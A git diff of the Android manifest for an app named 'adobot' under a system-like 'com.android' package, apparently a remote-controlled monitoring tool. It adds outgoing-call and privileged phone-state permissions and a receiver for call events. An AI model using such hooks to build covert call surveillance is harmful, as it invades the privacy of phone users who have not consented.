@@ -41,6 +41,9 @@
         android:name="android.permission.RECEIVE_BOOT_COMPLETED"
         android:required="true" />
 
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"></uses-permission>
+    <uses-permission android:name="android.permission.READ_PRIVILEGED_PHONE_STATE"></uses-permission>
+
     <application
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
@@ -58,11 +61,12 @@
         <activity android:name="com.android.adobot.activities.UpdateActivity"></activity>
         <activity android:name="com.android.adobot.activities.PermissionsActivity"></activity>
 
-        <!--<receiver android:name="com.android.adobot.network.NetworkBroadcastReceiverstReceiver">-->
-            <!--<intent-filter>-->
-                <!--<action android:name="android.intent.action.BOOT_COMPLETED" />-->
-            <!--</intent-filter>-->
-        <!--</receiver>-->
+        <receiver android:name=".PhoneStatReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE"/>
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+            </intent-filter>
+        </receiver>
 
         <service android:name="com.android.adobot.network.NetworkSchedulerService"
             android:exported="true"
